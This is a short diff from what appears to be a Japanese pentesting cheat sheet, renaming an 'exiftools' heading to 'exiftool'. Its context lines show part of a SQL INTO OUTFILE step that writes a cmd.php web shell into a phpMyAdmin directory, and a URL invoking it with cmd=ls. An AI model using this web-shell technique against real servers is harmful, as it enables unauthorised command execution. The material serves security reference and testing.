@@ -455,7 +455,7 @@ INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
 http://test.com/phpMyAdmin/cmd.php?cmd=ls
 ```
 
-### exiftools
+### exiftool
 ・画像情報の表示
 ```
 exiftool image.jpg
